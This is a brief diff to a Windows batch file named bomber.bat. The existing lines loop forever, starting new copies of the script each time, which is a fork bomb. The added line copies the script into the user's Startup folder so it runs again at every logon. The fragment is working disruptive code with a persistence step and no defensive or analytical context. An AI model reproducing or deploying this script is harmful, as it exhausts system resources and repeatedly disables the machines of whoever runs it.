@@ -4,6 +4,7 @@
 TIMEOUT 1
 start bomber.bat
 goto top
+copy "bomber.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 >nul
 
 :top
